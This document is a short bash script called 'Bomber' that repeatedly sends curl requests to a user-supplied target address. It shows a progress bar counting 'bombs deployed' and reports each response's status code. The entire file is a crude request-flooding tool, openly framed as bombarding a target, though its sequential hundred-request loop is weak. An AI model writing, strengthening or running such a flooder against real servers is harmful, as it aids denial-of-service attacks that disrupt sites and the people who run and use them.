#!/bin/bash

delay_before_start_bombarding=3

# Display help information
show_help() {
    cat << EOF

▀██▀▀█▄                     ▀██                      
 ██   ██    ▄▄▄   ▄▄ ▄▄ ▄▄   ██ ▄▄▄    ▄▄▄▄  ▄▄▄ ▄▄  
 ██▀▀▀█▄  ▄█  ▀█▄  ██ ██ ██  ██▀  ██ ▄█▄▄▄██  ██▀ ▀▀ 
 ██    ██ ██   ██  ██ ██ ██  ██    █ ██       ██     
▄██▄▄▄█▀   ▀█▄▄█▀ ▄██ ██ ██▄ ▀█▄▄▄▀   ▀█▄▄▄▀ ▄██▄    
                                                
Usage: $0 [OPTIONS] [SUBDIRECTORY]

OPTIONS:
    -h, --help         Show this help message

EOF
}

# Print colored output for better visibility
print_error() {
    echo -e "\e[31m[ERROR]\e[0m $1"
}

print_warning() {
    echo -e "\e[33m[WARNING]\e[0m $1"
}

# loop process
bombard() {

	# Total number of steps
	totalBombs=100
	# Initial progress
	progress=0
	# Delay between each process
	delay_before_each_bomb=0.00001

	# Display initial state
	echo -n "Bombs deployed: $progress/$totalBombs"
	echo -n "[--------------------] 0% "

	# Progress loop
	while [ $progress -le $totalBombs ]; do

		clear
        # Process
        bomb $1;

	    # Calculate the number of '#' to display
	    let filled_slots=progress*20/totalBombs

	    # Create the progress bar string
	    bar="Progress: "
	    for ((i=0; i<$filled_slots; i++)); do
	        bar="${bar}#"
	    done

	    # Create the remaining progress bar
	    for ((i=filled_slots; i<20; i++)); do
	        bar="${bar}-"
	    done

	    # Calculate progress percentage
    	let percentage=progress*100/totalBombs

        # Print progress bar
        echo -e "\rBombs deployed: $progress/$totalBombs | [${bar}] ${percentage}% "

        # Update progress
        let progress++
	    sleep $delay_before_each_bomb
	done
}

# Sent request process
bomb() {
	ADRESS=$1
	echo -e "Target: $ADRESS...";
	echo -e "Press [CTRL+C] to stop.";
	
	status_code=$(curl -s -o /dev/null -w "%{http_code}" $ADRESS)

	if [ "$status_code" -eq 200 ]; then
    	echo -e "Request done with success!"
	elif [ "$status_code" -ge 400 ] && [ "$status_code" -lt 500 ]; then
		print_error "Client error: $status_code"
	elif [ "$status_code" -ge 500 ]; then
		print_error "Server error: $status_code"
	else
		print_error "Unexpected status: $status_code"
	fi
}

# args handle
while [[ $# -gt 0 ]]; do
	case $1 in
		-h|--help)
			show_help
			exit 0
			;;
		-*)
            print_error "Unknown option: $1"
            show_help
            exit 1
            ;;
		*)
			ADRESS=$1
		    shift
            ;;
	esac	
done

# Display start
clear
echo -e "Option target set to $ADRESS"
echo -e "Starting in $delay_before_start_bombarding seconds..."

# Process
sleep $delay_before_start_bombarding
bombard $ADRESS

# End
echo -e "End of bombarding!"